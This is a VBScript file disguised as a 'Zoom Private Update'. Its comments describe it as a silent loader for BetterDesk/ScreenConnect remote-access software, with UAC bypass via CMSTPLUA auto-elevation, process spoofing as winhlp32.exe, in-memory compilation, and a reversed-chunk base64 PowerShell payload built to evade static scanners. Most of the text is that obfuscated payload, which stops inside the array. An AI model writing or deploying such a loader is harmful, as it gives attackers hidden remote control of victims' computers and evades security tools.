' ==============================================================================
' Zoom Private Update - silent BetterDesk / ScreenConnect loader
' ------------------------------------------------------------------------------
' Evasion: staged in-memory C# compile, COM auto-elevation (CMSTPLUA),
'          PEB ImageFileName/CommandLine spoofing to winhlp32.exe,
'          NtAllocateVirtualMemory native allocation, TLS-only download.
'
' Modes:
'   (default)      install, hidden
'   /selftest      compile + PEB + native API + download/hash check, no install
'   /noelevate     skip the COM elevation attempt (used by CI/selftest)
'   /elevated      internal flag set on the elevated relaunch
' ==============================================================================

Option Explicit

Dim sh, fso, env, args, a
Dim mode, elevated, noElevate, iconPath, waitMode, rc, logPath
Dim chunks, i, b64, psExe, psCmd

Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

mode = "install"
elevated = False
noElevate = False
For Each args In WScript.Arguments
    Select Case LCase(args)
        Case "/elevated", "--elevated"
            elevated = True
        Case "/selftest", "--selftest"
            mode = "selftest"
        Case "/noelevate", "--noelevate"
            noElevate = True
    End Select
Next

Set env = sh.Environment("PROCESS")
env("ZOOM_MODE") = mode
env("ZOOM_ELEVATED") = IIf(elevated, "1", "0")
env("ZOOM_NOELEVATE") = IIf(noElevate, "1", "0")
env("ZOOM_SRC") = WScript.ScriptFullName
env("ZOOM_DIR") = fso.GetParentFolderName(WScript.ScriptFullName)
iconPath = fso.GetParentFolderName(WScript.ScriptFullName) & "\Zoom_Update_v6.1.0.ico"
env("ZOOM_ICON") = iconPath

' Base64 payload, stored as reversed chunks and rebuilt through Chr()-free
' array assembly so static scanners do not see the PowerShell body.
chunks = Array( _
    "h1Edul2bQV2YpZnclNlL0VmTbByegknc0BCIgAiCNsHI5JHd", _
    "1NWZT5Cdl50Wg0DIs92YvR3byBVe0lmc1NWZTpjOdJXZnFmb", _
    "N03egg2Y0F2Yg0HIyEzcsRlO60VZwlHVs92YvR3byBVe0lmc", _
    "2U2chJUbvJnR6oTX0JXZ252bDtFI9AyclRXeCp3ZkACIgAiC", _
    "v8GbvJnSSJ3NPFGU0Ymd38CdrRzc5QGc4RlengyZulmc0NFN", _
    "TVnezNFTFNnRBRFaSNkSCBnd5ZzbuRFTwh3K05EeshkVxhUR", _
    "502RGl0NuNUWnZTVnNUVn1WVFhGMvImeLp2YLpGSwF0c5dzL", _
    "TBVeTFWZvE3ZrAjN34mMTVHUqh1b0Ekc1IEeRRzLQ5WYWNFO", _
    "oNkeUFnMClUawNzZu9mSq92VSBjTaFkdrVjWwBzUpNjS6dkc", _
    "iNFTUJmbI1WeN9WMH50ctdVZ2JUdBVTZhpHT0Jza5NUZnlla", _
    "2IGeiBVahNGe4YERpZ3LkZTbxMVNqFzYs9SOGVlYCJmdZN2a", _
    "UhjT1RUWwlHW5hTNJxURFVWU4UjezAFUThTU4ZzYkhDZ1ZGU", _
    "tdmS6ZkMFdmbxcWdRxmRYdjVChlb2AFUytWVXhURxQ1dlBla", _
    "QJVM5UDUJhXSoVla0Q3buRjYGZlca5Ec4RnRLBlb2YXda5EV", _
    "4JDc00mcyNXawNFZkdDU58WOxREclNTRpd0RSRDe1MFdVFEM", _
    "nhDN2JmYHRmYYd0YQ9WbxUzNxQkbaRVO1MDdy9SYCZ3Z2QmU", _
    "alETOJXV4UHO5NjZ052Y2NVQGtScyInY5Z1Uxk1VUdnT1ZmR", _
    "JhjcjtSNrc3Q1AVWj9Cdws2LXZVMxJVM1pkVkRjQQlES3Rmb", _
    "rJEeXN1cltyaodGWwIldXZkQzQGNSB1Y3cEZkRDdCVkWzFjS", _
    "0g2RkZXYjp1MNRDailzb5I2d5Mna65kchZ1Lup1Z0FHRV1kd", _
    "lxUY5gTO0hHbkhTMq9EOnRUZ6RjdmR2L3EDNid0c5QkZrdUM", _
    "1BjQ5QTbppWcGZTZEJXcoN2LrUUW480YygUZ1MmcklTZ4UGU", _
    "URWThFEW6VnZjlne1ZDNalDTvF3Mnt2Lxx0NMpVZVdVZrIzU", _
    "mpHNEJzLCBTOOR3L2sWdOFmajZWaRdWNEp2ZRhDVhFmNx8GM", _
    "w4GSaBjcu92LUFzdD9CNtZVOSFGVvMDWoV2MndlZVd0M4EjV", _
    "lVXM5dVZqBTMCF1brcWRBxkaZR1Yz0ESD12ZHJFdsx2YvgnT", _
    "lp0KsFGTnl0VINjbGpFS3pGcDpFSNVVOBVzMBZHUwt2VXdkc", _
    "WdmVzo2LoJUSl12cLlVdrY0dEtUc5wGOVZXMxIjZYtUeyIFe", _
    "aZ0ZhVHOhJEdN9EdrwGUod1Z2VleCdTSoZmYHlTdLFkaOdkW", _
    "pFHUvNnQyhlQZRkR5RkcFN1KSRDcuxmTTlWdNtUZr8EV3g0M", _
    "nNjYjlEUyI1crdEOOdXR2t2bMNjT4dzR4gTN4ZER2UVRQZWN", _
    "aBjeTZma19mYadGe1cnZ0dmTwl1QwIVeQ1WY6xWeY9ScvM1Z", _
    "ppnNztEdCtGZ0ZUaPRme0U0b04WU44UQWZjct10UaJ1Kad3T", _
    "HBjSjtCN3oUZiJUdDBjU2wERzIWcBpnYlFGNx50dk9iQDtyQ", _
    "N9CVR9EZQJVYDVlVndXaz0mUQFDZINWeoV3MoFHMzYXdZRVM", _
    "6xGZJRTQUhEOaZmMIFGUuRmV3lEZYJkeq9idMVVT6hDV4w0L", _
    "K1ERtpXZixES1IHdvNVVH90b2M1TvdjeTplTmdDTyUVUyR2S", _
    "2NVS4Z1ThZFUvcDMLFzYxMXTBRjNxMWaGpWRaJXRSJzU59ib", _
    "zkjUIZnbWZGNCdUO3Z1YqZDWxg0YzJ0T5FESwUlbrR2QVh1b", _
    "S10dKdWV4k3UyIzYRN2UBVFa5NzQkR2dHVmethEUvRDRQhTc", _
    "iRnWxJHMzEUTvkWOiVEa4QFRpRTbxIXTlZmW2sCVr52SLFjZ", _
    "5EFRTlTUINFZOV3UxsieTR2NQ5kNEZle2UUN1MkUYhUTWdGe", _
    "ntWa3p3QQV1ZpN1UxtyYEVEcrdTarxENLpFOqR0aqpUZwoHV", _
    "0QXa5R3T18SZMhzNzYGavpFa6NGcnNkYlJlS4d1dRZVaP9Sa", _
    "qZTeyQ3Sr8kSLJ1R6l3U2wENxRmRYp3VxUmSj5GbMBDW5EDR", _
    "QNDZGdkawZnSwEjQKxWQwF0Q3c0YChFSGdTezRGM3JkSWhkT", _
    "K5GVnd3NNt0a0JGW1tCdplDb3FkciNUWENkWCRWe3s2Uptyc", _
    "LR1QGdGMy10bCtmdUljcpNHVrEDUVl0Zsl0S5hUVDtEd0RHd", _
    "GpmaTVWaVl0TXhnbK9yd2JnRvYncotUOWdmZqRkUQVERVdDU", _
    "G12aklGN3ZDTWNXeCtyRSV0d3knZKF1d2wGUIpUcyRTbP1kN", _
    "CtGSndXY1xURtxEUtVHWrtyVkBzMJxEd6xWNLZ3RWdVO6RFe", _
    "31EVEFkQallaMJ3QlBVWa9WUnlncwoGaW5WMnVGS5ZFVUlGR", _
    "XN1d5gDVopGTYF0Vv92avQ2S5pFT69WZqd3aroHWKpnVNJ3N", _
    "sRzN4kkM2QWZYpUcMFXbJVnUXlVUOZGWvIEUCBjNlp2YiVDe", _
    "qBjMwUlUBZETqtGNmllUTdGMIJkdIBndsZFdWljQJJmVEh3Z", _
    "yUGSQlFWKhWQOhXWhdEMm9CW0UWMvB3MHtWVzJ0UllHUUZTe", _
    "lNURSp3KGhTe3RTbDlFUjVnZyFzTtZTWsl3Sh12K4BXQ0MHS", _
    "w4WRnF1NGFlZFNHawgjYZlERyIVYHREephDaHhXcKJUUHVHS", _
    "qB1V3l3br8iTwpFbCpGTod0V2dXSGpWRplXYvZWYTFWMCREe", _
    "xlTNvZTMMZEZ0FURzgHVRNTYCJEZBhXbFhUTpRTZjV2UFpGb", _
    "kFEZNNVQ1N1UBN2VWlESvplVRRla2onTrATcoJHepZDZq1WN", _
    "WZ1ZEZ2Qk9COn5mYnJXd2sicml3SGhFUUhmREVEU3UnWoBTM", _
    "B5EV4hTe5U0SW9WZW9maRZzKLVkVZlGOKJWV4Q2TvhHdKN3V", _
    "zpmQOBlQpV0NUJDepV1Uj5UV08EaLVnRSJzSShVNip0dvNnS", _
    "xIWQrJjdLVTQ5IDb2g1bOlWVxczZB12bwV0L1dnZqhUQslnc", _
    "VFkd6JzUO1GdDRkcDpXUyN3cyBFe1hldvZUaIVWSjtkNYdGN", _
    "vBTOjh3d2lkcOlHMRpkempXeqRleup1VN5WOY9WTtxWeiBje", _
    "KtyUaR0b0kmcnNma3dWQ3E3djVFVNlzaWlDbohHSsN2N1YVT", _
    "44UT2kWNERES3FVNrtGa4E2dSJDeXtSSIRGValHUCxUY1EWR", _
    "NZTd5dHVrp0SjNTe1JDOudDe4FkTWN2QExkRJN0ZzN1RKV3S", _
    "uBnRilHe4kXUm9kWnN2U4NWdLJFazkUbxAzY39EMl1kQOZnc", _
    "RVTNCJEeQ9SW3F2ZuRlYH1GVjp3VitGUsV3TaNFMEt2RyxEe", _
    "RpWa2tUT5h1QCdUMRh2ZFBjVPp3K1MmN2tGcLxWW2pGNS1GN", _
    "tpHTvFWVNtGSFJ1SiNFM3xEdvVmS0hnYI5kaGpnSzQkU5p1T", _
    "0gmeLRUdmN0QjlmN2IVe3E0Q2ljRmJUYmN2L0hGM1gkVI5GR", _
    "nVVbL9mTVx0RBpWZZhTOtRla2VWNxNTWoVjdtdTTM50NNRUQ", _
    "sVEZKdXa2tkaBN3auVTTIFUbIhVQvEmb6R1LYplQyhjWTFzV", _
    "wIVdNlUNYZEeFBnV6lkcqtGbWt2audEdxRWOT5GZU1mSaZ1K", _
    "BBFSUVzU1IUSmVFevk3bLFFdrgDd2U2d38EeQ90U1R0dPljZ", _
    "rhmMFNnMJ9WSpZncrRHW4YHVMhHO0dkazxGUGZ3LqVXOS1Ud", _
    "wNnU18CSp9yTYREOzUGUq10YyV0LitGMTh2RIlWe2NjSwJTT", _
    "wFGOENTQZZVaZFUUWZTWIZmbYB3RwczSYlzS3MlaspUME1WR", _
    "2VkaGVmQW1WWKdmQnBXaYNDSr0GZhVUUYhDZr9iSyVUM1EEZ", _
    "XhVQ3EjQoh1QYNTS2YnUVNDOUBHNG1kW1hUU1BHM4I0ZjhXb", _
    "zp2SkJGMlNFaqp3V4ImcNRjcNtSSoRWdztmRVhUR1RlVsZGb", _
    "mtEd500UxwUTxwUQ3gnN2wUQx4GR4hGWyZUQGRXWHp3Mz8Ue", _
    "XZnWENTOOZlZ6Nnaz8iWIVWS0NENB92ZrhUewV1Lyg3d29mT", _
    "OFlZKFlZt1kT6pmM2hWM3JEWkpWYWp3NlxWY00EZmNmUYZ2Z", _
    "nZXR6ZmRK9ieVJ2a1wmTR5EZnFHNB92U6FFTWJkNOpXY6tyd", _
    "mFTNzkzV5ljZ4oXMzgWZplnWIhUQGV1Rtt2Zu5WanF2NGZGO", _
    "TN0Nsp3dyxUNGhFS2hENYhUWYRWexZDVphVW6pGSlRmb2dTO", _
    "vM1MVxUbWl0YGBVO3RFbLBlYxE3VTJWc1l2dCRjazhHOqdDe", _
    "0IXM3NUOHRnRW9GdQFjcD9GOyJzV1IEUCZmQFFkYVl3RstWR", _
    "w9CV3VXRpVHbDNWSyhVWRRFbht0ZQRUatF2TzVzSKZVZDFHd", _
    "rNnesFVO4BDMxQnbmljSNtCb3syYaZGZvBzVVNXQzR0ZZpFO", _
    "0YmR0glMQ1WZhREU1olURRENIdmY4MURrMGN3tGR2IEWqFHV", _
    "pJ0QzNUQ6VUO3JjQ05WSyMXNZNDc1MkVopGa1QWSZFkW54GO", _
    "NdESxw0NSdkVlp2TxxGe4pWdpdkQJtWMZRWarMmcSBHSrN2T", _
    "4InV6hHWzBFWG9CUltWb4okdVlUWxFXUXJUNJREe0A3KrEmd", _
    "RNzcyIWN0Z1SvEnRRl3ZqFDMLVlMS1kYWBXY1hWNFJnbrtkR", _
    "oJGO41UTLV2LKpFcnRVWDFXbmpXVyETW5l0QDNWMoFGSEJjS", _
    "3hDe5YTcVhjep1mMtZ0Y1dUW49UQBpGd2pmVF9GSFt0TwZzU", _
    "TJUYrlVQI92daF0V6ZUclZXZywkVrIkdYpkMxFle3h2U2MjQ", _
    "hZVVt5kQVh3YsFXdahkYJlUSQl1KJhWYml1RTNVO3BVTPFVU", _
    "1J2Rv9WdNJzdwR3QMFDcN9yZkl1T5J1MzIkMmR0b3QXMqhjb", _
    "rZVWZxGd2s0NHJlSEZkVEhkTYp2RXJHUxJFavo1bxJHTkZkQ", _
    "2A1QkVndQF2b2EEUmRFS5JleZVjQNd0ciVVeKNlTQhkZ0I1L", _
    "ol3a5ImNYh1U2FjdoV3SxcHeZRVONh0bp5UVNxWRVJVNvAFM", _
    "yNHRIZmeEVXW0p3QXtmVD1UYjdnZnBlZHlVYwkFZ3sGUWFHW", _
    "VhjQn5EOzJ2QTVDbCp1d4syMrU2L0ZmY1dEU2RTZQ9ESG9GZ", _
    "KdTME9iaaJGZwgke0xEVq9SVtBjTMFmRxk3Yp9iUl9yQMFnW", _
    "3oWYpZWaQdmTyJ3dL1UbrZnQzVWWsVTW2lXZ6RjSI5ma3R2T", _
    "DVFOVZWNOl1Mth0UEJHNSh1bqtyMtVXStJUeqJkcKtGNjZ1M", _
    "jBTbt1UaMtUcXlEWSBnb0NlSsVFU3s0d4hTeT1UZppGeRlWb", _
    "5wUZupWM3IFdWZXZJZmcGhWMih2Q0F0YKdjRsdnZsZUWVR3S", _
    "jRnWpxWQRJEbKx0Vkdld1RlaGpXMY9ESPpVRtlUY05kdGRWV", _
    "iplYR50bFhnaTJXQjd3dINGbPdUM0ckM3pWYWRXNX1GcntGT", _
    "U5mWaBTTJp2LIhTYRpmYZh0LvlmUYpXTwEVcLFlQYxWMrhWM", _
    "yQWNIFDNSdXcnNXVWJ1apBnMxIkdwwWVkplYPJXOvYGa1VXW", _
    "hRHerIDN2pmWN92LtlGanV0Y2omMnNmQ1Uza2tSb4VmSXlFc", _
    "tJXZycVa58WWCZlbpFTOPVHbDV1R1x0Uhl2bBxmZ6dXZZdEM", _
    "6lEUSFHbMhFdR9EUOpmW0EHbHFzSFdXSmFUZZtkNTZkeMFnW", _
    "olGUwQXSq5GTGR1TRBDZhpHdqZDaK9mQP50LrUEMvR2QohlM", _
    "td3YwFmdzxmaJVVVVx2SyM3VGlXMPBXeCFVR4dDd3ZXTLFVY", _
    "JNmQDBXRNN1Topnd1cERrN2TzIXSYhkQoF1Z4oWRL9GTadHT", _
    "FVXcvR3ZEJ3RphlN29kYrM0aSlmU5gFey02UHR1YH5kazljR", _
    "D1UeslmR1JmdlZGRyJ1LU50TNN1NFhVeiplNVRXR4YzS2ITc", _
    "uNVWThDUww0dKhzTXNHcxZ1VFdnRJp1RHV0T3VEMjZmMupme", _
    "oVka2RUZ3Y0ZNtST69mM2EjcYVmNJFDZ4EGNvBFZ6d3TnlnS", _
    "qFUQrFncONjeJJTVJVEewlTdPBzaUJVbGZ1U65GNXVUcRd1N", _
    "Zp1cLt2SyImcyNkQqNFcVVnRWFnMH9SVpF1Qrl2dypGUBV1c", _
    "ihVQmV0TyVTYJ9EZVRXQ1JENsJzMEZjN0kFRHJTTQhmQwADT", _
    "G52ZSNDdoFlRrsUMl1GUnNkc4siMIV0VDBnV1MmVpRlWvtWO", _
    "FZEe2sUZKBHTjJXTyd2LpNlYZJ1d3VTeItUYJhkUl52Z0tiQ", _
    "jdETUhTTNVnbO52LTdVRMNEc49iTkFXbwsWdWtmQSJmQY5UZ", _
    "iJTOJBFVPdkSR9CTDhDVtxWcjx2K2RVaWdEO1UkYONmbuRkM", _
    "0MkMGhEaxYmYmdzbrU2U6RzZxcmMj5GanNldstmdmtmaplFM", _
    "XBFeONzTWZ3T5gmQy0UdxNUYwYFVFF1TxZjRSlEZ0pFMwEna", _
    "ulUR2cGRRNUc2FTZShzNvwkNBRUZ1ZVUkpmWJBnd3R2dBVlY", _
    "wxGRDd1cBZVZU5EWwlWVO1Eb5E0ZR52RGVUcQhmV2B3cuNDN", _
    "ZlzbtJ0SuZTeEV2QIllcoBnd0Inb2A1dzw2ZJhzay8WdFFmQ", _
    "TdnVDZFWCZGMMBncsZlcSBnd3EndLtkN3pWZwV0Yw8CRWhGN", _
    "BdWdohDTK5EMkJGThdmTtJXOw9SVtF0YTdXMSZjNnNENnd2c", _
    "rp1a1cGUaBzRSVkU3ZXSCVjeaV2Z2hDc4kHV1tSWNx0S0c0c", _
    "v8UQHNlNEFUWBJWUl1GWKBncihHRnF1YulWNSRHa2FXZjZ3d", _
    "5lzblJ1UTd0aydGNUVGNrlncKRXNlZmcGJWcDV0LYpXNZFzQ", _
    "6pmcjh0T4ETT5MGZI5URIVXdpZVOW9US0k3KxpnSQVjYHhVe", _
    "BlGWChmVNZ3YlRFdp92aSBjcLxWZVJ3QMR0QVNkchxkVGl1Q", _
    "Wtkel90QNBzMyQWVxdlRXBXVUh3TIh3MzJDbxd3NFlUNBlkS", _
    "YJGZ0QUd4JWYvcmTrk2bv8WczsWMVp0atlGOxskSzR1dzAnb", _
    "vZ3brYzd6NTd19EOzljdrEzLoVFeC1kdwJzcENDNCJ3VQdDZ", _
    "WpGSolGMws2RxkVNypWaQVUWLRnYEdVa0ZjR5hWYtJkVORkZ", _
    "1VDasFjUCdFaLJTZnhEStVzK1V0Yq9kTxYFWzBFRkdmUBBXN", _
    "QR2N6BlZzcDO4oHM1o1TwA3RRZnUQNjRmR2NIBXNnVnNotma", _
    "BpVUaJ0btp3b2IlUpdWQtN0Urh2Z1gWS5cDSnNXY3lFRXFjR", _
    "650T1V3UqNUTS5kUhdEbJ5Ear4GSLV2KyIVNFFFMRd3ViBja", _
    "VZkZolUbEdnRrlzdaRFdrdVQrN2L1plbOhTTGRURiRzVXJ2Y", _
    "yIlNZh3a6J2KPhTRthkMidVam1keSF2NOR2S2dnMDpGTzg2N", _
    "69UW19GWtFVU6FUcCJTcGJTUwVWZx8GeyQ2VhZlUIFUQ4llW", _
    "ElUVFFFNZR2dMp2NpJ2dpZERr8GOvpmdlhUeMFUYIdmbXV3N", _
    "zEkWwlGUR9CNipVRkZHWENmUQJzNrtkd39CVjh3NvF2TN9iT", _
    "UZUONZkZyVTQw5ESZdzTLZkQD1UMvBlZ1Rmc0JWUWtSa1UGM", _
    "DZnM0JXc350baFTT4JETN9iYNV0L4cjYrUzVNdnZTVWd6FVV", _
    "0FFc5lXa2RWbqVGVspFRkJVUUBXYYVkVulmV4JDdmZGT0tiU", _
    "0N2ThB1MwF3MpF0MLp0TMdnR2AldMdDR3I0dohzNYhFTZVTT", _
    "hh3duNUYyRUaJ52bHxkeYJjeI5EatlGdINmNQljVoNzVBJXZ", _
    "DZFdBxmawJWQLB1dBxWeQJFUox2T5FEc3YWMiBXYxBTaYZWb", _
    "zM0LZVFS3s2MltyaUFUYDxmQ2kmbCVlQkZVYoN0Y0EDZkl1R", _
    "ih1Z55kYWBjb45Uel1WbxV3SThHeq9maUJWYlZlQ2N2d21Gc", _
    "PZmYZFUc5NDWxclSroVRItUODdXe1IXSQl2MElkM39GN4ElU", _
    "rEnW1JTOClGUTNTMFN0NRxkQ2QkbIFGVpVjTz8WbYhHapFjb", _
    "mREcJJ2b1wmTol1RLdmZtVjUU1mWBFXQ1JnRZJTUvgGcaR3U", _
    "iV3KyBlVStiUStyTsZTRzJnZsZjWSpFeNFTNQpWS1kTa0MDU", _
    "5oneRhlcNtCWWFmZqVDVrw2ah9GZlFzVnRzRroFbwBTOzQXc", _
    "yJkWXVle5Z2R6Bjbr0WOvUmZy5EdnJTQ5gUU5F3ZYZVdmF1M", _
    "y9iTlV1ZLJ0drMHSJNmMKB3aKVFandXNvRVc2ZXbUlHSaNDV", _
    "SNmW1EkS1onWLt2Sl9CUQhkdq9WRPlHTvMUdXNXM6ljcXVEO", _
    "o9EN6NEZB9yK1AncronNVNDckd2NkZjZ3IVd5RzM5A3MxFnQ", _
    "ap3av8Sejh1T4pnUadFd19kdoZzakBHbkZmSUFXMr1WZxwWd", _
    "stiZolzVOtiNkRUN5MUZxNGT1gUcadjakN0QWNTbCV1NVlDc", _
    "JhEWYBTZrElQ3I1KpdmS2QnQCZTVpFTVQtyUqxmdtZ3YiJHW", _
    "t9Wa0FTb280ZJZ2Yll3QIdHO2FlNLdGNQJ2UXFDO4Z2VTRVV", _
    "y8WdnlmTRlXMyxWb2QDW0M3aLdXexEHVxMlVSpUcMhXZzFTb", _
    "5NWNJ1GayUUaxdkSTdEMvVUcJFVdZBTVrgWYSR3arIUcuZUb", _
    "K9yZ0YEU28WWFVFN6dXO2NFbIlmbh9UWxZTRItCTygVYQpHM", _
    "yQGdoBXZ6JXe0YXa5V0dGlmSvIXOEBlawQ2RklzdxQXMJFHb", _
    "4knYrEHajhlM3QUZqZjSWNTUrsyUxY2UWVnU1NFcuNGNohUc", _
    "MJVOn5keDJDW1cGT2pGa0p1ZPZXRjBnSYZmUGRTc1VUayknQ", _
    "xVHargmNK90KSZXZv82MP9kbm9WZ1Y1M0ZDOMZnNvVndEFEd", _
    "0knQSpEU0BjaTtGdDpkWZhjMUx2QlVTYy1GN4JUW15GM5cEV", _
    "SpUOmZzRLNVNahlcpFXerx0aSdEcw8ETHd2U2Q2T6ZHdqdHc", _
    "PlUWYZ1LoVUV1UzY3UlSihnWPRFdtNzT5FkQQJUZrhnYwFUd", _
    "3dEZKR0UaxEZax2T2U2TEZ0SUFWeY5WU2xkZaZTQkJlTIZmZ", _
    "1EESW1kQLN1dsZFRk5WYxtGbXJGdkZDS4kVdzpFMNZWasFFT", _
    "mZ3LMZWWvI3NSFVU2QnQDhGa1YEaNtCOn52TaFXcqJ1cp5UZ", _
    "HJUd25WUCxWdjJ0cxxkYZpUOCZGV1QDRPRVTWpFNxkmQVdmQ", _
    "kB1d2UXQ2YFb4AFb6tWQuFTYrR3KWpkbsN3NwhDOYpGehJEW", _
    "HZmd0gUaZBTS3JUZCZGcKdnR0JXSXxWVtJEWUJ0dPR2aBR0a", _
    "TBVaIhUWLZmMuZ3ZhZ0QjlEaHFlY4YGNFtUZTR3QSZXSRVkQ", _
    "KpHNLF2VD10UT9WZUhXVihTW0kHSCRXMOFjcJlXa2Q0Ui9GW", _
    "SplTMl3NwYTQWhXRoJWRnlUNopGRZ9yVRJVSztENwdXTQN3d", _
    "uFzTWJ0LYdHNNJzZsVHRWBVWFFkNlR3YhFFU400TzhWNa9SV", _
    "yNDdFJVeJhUWzl0dwhUbkVHca9ENlFlQyhHSRtGZyQnaxlmc", _
    "xFGT4VFSiJXWjF3V2IDRi92MndjSxcjWwlGdshlTW5mVzInS", _
    "VFHO1MTcPhzUHFEZIJ2diJkan5WS6NEZGVXZuJjUkFXNtV2R", _
    "BFXdxd2T1hWTWZFTNhkerYDbotSMx8EN0NWNvQ0cipmTo9mN", _
    "PlTWVRmMxYVOWZWNP5mTiRWdP9CO19UNIp2Z2pVc3QVbRRGe", _
    "OFkcyATcxNXNOdjYol2djdXeTpHe0lTMhdVZGl3K2RFTwcUT", _
    "0VDZ2lGa1hFWrdXTNN0UNJUWFRFOWh2MoF3YtlWbrIUMNhkQ", _
    "3kVMUhjNF5GRuVUcjlUeSdmaDVkYKFnMPhGVklGVpZlNF1mR", _
    "zsSYUZ0aPVFV4EETtFXYvJVRmJjRiZGcspnQ1c3YJVTNPR0K", _
    "G9GRBl2VLhFTxQXNKNjQMVVQQF3UkFTcMVFVrNzNnJzSVpFR", _
    "ypUcZhDRz5kaPVjMW9SQX5GMml0c4BDVwVjYvZ2LQl3MaVzY", _
    "3cnalVFTOZ1axkGbkxWVwZjandTO4d2U0cja3pFew9CaMdmU", _
    "0t0dm92YRlFbJ9GVQ9iNUxGZnl3MzZDbslDWU9WZxlja3QEM", _
    "sJzSEFjT3gGUHpWZYZjMuNmR0x0Y0JDNilmY1ZHTBF3N1c0N", _
    "pRjZzgTd3gFVVRzVRFGdjFjQ5FHMVNVT3JTOVNlZYVGWll3L", _
    "uJUeZJVezhzNYNzMydGTiZFaENjUjNXOmdkM1REOuNHWxYTa", _
    "hNmahNDbCF3NThDNiZFWU9STzNWehFWbwo3dOJHch5GNzhjQ", _
    "x1mYVdmSjdTQvgWUxQ1RQVmbTd2VM50YGFTQKBFS1tSeW5GV", _
    "2omSrIjVYJ1UrA1Y5A1cVhFbB52YtR3TwgGdEdjY1ZnT0djb", _
    "KVjNGJzaZRTcnFmaLl3QYhzR5Z0M5pEc0kFTQFDep9SVMNXY", _
    "1FXYvl1R3x2a6lTYLxUaaFnTVxERBBTdNpUbRVFbZFGeaZnU", _
    "IVWW6JTTxZ1NwY1SRh0T5E3SRdGTBpUZWdVMrAlNiFzN0hXR", _
    "vRUMWh2SS92T4Q1dwdnVZRHbhJ1NNxUOlBDVJlnZsFkRRd0Y", _
    "mNFcjJUZTVmRupEd5J2UxQFOmR0Y38UT6ZXQidEeNhzaXFjb", _
    "tFDO6ZVaiNDezY2T4pENvBjY550aYFUMYlndzxEM2gGW0c2Q", _
    "ENVMxQje10kSwIXUFtyMQF2ck5EerZUUwYkQmhWaE50c1sSZ", _
    "yQnWthUN4cVOptCaO1WNupkSadzbu52b2RUYqtEOvNTarE2K", _
    "490bXF2QtpGRJZWaChzZvFXYHRVNwMmbsl0N5F2KyVXeytWM", _
    "1x0dwhnVQl1Uz10UO9mUxc0dYVEN4IlTXRXcDFnbLN1Twplb", _
    "WZ0arZUbl12aGtUSr00VVNDRrUWUjJWeWt0SiRTUiBHbRdXV", _
    "SxmcxlWT50UZPFVYVt0c2o2NzV1VrdWYyl0K15kN0c2bjBlQ", _
    "0NDcrl2bzgka4lWcal2cLNndzRVYCFVR0NTSV5GRCJjdHZjU", _
    "zFmMzhVNyFlQnlHZEpEbaFzYr5mZVVnQKVlVuRXdSBFZCFTO", _
    "r02S0clZq5UR5o0M4V1b1gUeThmM50kQMJjZ20mNnl2TBF0Y", _
    "vYXdVpESFZjcmxWevJkahp3VKFkW4tyRXdTWzoET2clR3czK", _
    "kJ3NZZEVkpUSRVTW0sERqdncVFUSqZDNQhUTZR1ZzMVe3MmN", _
    "6dHSYZmcWFTTaFXZXNldyoVeKpHep1mNpRVRFVDcyAzUSVDd", _
    "kRjQhZ2N2ZGMP9CO5omYQxGe29CZ5YFWlhXN2VmZvYGMyNDU", _
    "wF2ZxoWVVV1NaVmUuZkVhNUczMXeGRWZLx2TsN2YXN2VVBDS", _
    "zUTWGtyMy5GTLV2KodGdMNGaYh0aHZVRl9GMFpVUrgDM0Mna", _
    "V10ZqlHdP90c5gTc2BjW3RHMxYHUxInQW5kZHdjNLRVM0BzL", _
    "yRlYUJWOGNWemNTaxtSUz9maLtmM3J2MHlURu12TKBHOrpFe", _
    "LRkWqlnV2t0ZxRXVX1Ud1d0aNx2S652UmVHNsdERuF0LLN2b", _
    "ERWMIBjZGdkTGFnWld3ViJHR59WcapHeuFGURNUZwYDNxo3R", _
    "V9SQplnUDVzMIhEOIVVVDxmNUt2V6RHOWZ3U1AnduZDcRl2L", _
    "tZzKqpFb5ska2AFa3E0TuhHTMZDbIhzS34GeDN3MsF1TxITc", _
    "MlVUoBTQCVkSsdTbD1EN09EUTdEc2dVN4tWOitWZzBDUEZ3d", _
    "HJGZM9GU34mV1QmWT1USVVnUyo3U4YGb1tETUZUb3ZURDNXW", _
    "x8UOIFnNvk2YoVnZrETVSR0bpVXUxJFWwYTO3gnR1YWOvpXa", _
    "wwmaygHZoV3dttyd0kEVo5UUzMTcm10cWlld1VHMnxUcFBjS", _
    "pN1RrE0ashkNWtCbRJ3crlHWNhXNKZVRzglcwwWTrwWdkNXT", _
    "uNDUaJUSwMUMzVlR49mVQdDWOhmUUBXQYRXNrskNPZUZ0V1L", _
    "m1UWxJncrZzQ0RFcQBHbLdzVXBTVUdHSHJ1NW5kTth0T4dDc", _
    "1kDS3IEMRRkMsJXSH9icNBDbmlzYztCRRBTMtlXY38yYQ50R", _
    "uhjbj92cr0GRCtmayIjcOtUVysUUBBVMI1WTrkXSzkFRFNEW", _
    "yd3c4h0c2tSam5WYKdjZvUzNY9kZ4gFbv5kaohFUnljSPJkN", _
    "Q92a4UGM1Z1YDpUV5FlTNR3MWZ0R11mc4pWZYh2aKV1U1ckM", _
    "qJ2TtcXZOBSPg0WYlJHdTp3ZkACIgAiCNkyJ9gTavsSetJ2V", _
    "gACIgoQDpMXZ0lnQ6dGJsgSbhVmc0NVey9Wbl1kLPlEI0NWZ", _
    "lRkLu9WazNXZyBXbvNkLPlEI0NWZqJ2TtcXZOBSPgAXa6dGJ", _
    "pN3clJHct92Qu8USbBCLtFWZyR3U6dGJo0WYlJHdTVGdhxmZ", _
    "gAiCNkyczVmcw12bjVGR6oTXlR2bN52bpN3clJHct92Qu42b", _
    "kFWZS1WYlJHdT5yTJBCdjVmai9UL3VmTg0DIyVGZhVmckACI", _
    "gAiCNkCOGRVV6oTXn5Wak92YuVkL0hXZUtFIsAXa6dGJoIXZ", _
    "gACIK0QKoQmbF9GVkFWZS5iclRWYlJHJg0DIlNmc192ckACI", _
    "7kCKlN3bwNXaE5Ccpp3ZkAyOpgSZz9GczlGRuIXZkFWZyRCI", _
    "tcXZOBSPgA3YkACIgAiCNkCKlN3bwNXaE5SbhVmc0NlenRCI", _
    "pBXbvNkLyVGbpBXbvNkLt9GRlR2bD5SblR3c5NFI0NWZqJ2T", _
    "tVWTulUZ0Fmcl5WZH5CcjRCIgACIK0wcyVGdl1WYyFGUyVGb", _
    "hRXdjVGeFVGdhJXZuV2RuA3YkACIgAiCNUWdyRHJg0DI5J3b", _
    "u9Wa0B3TyVGbpBXbvNkLwNGJgACIgoQDlNHbhZGJg0DIlxmY", _
    "nwGbk5SblR3c5N1JoAEIgACIK0wJrUmep1Wa0B3bvcCI9Ayc", _
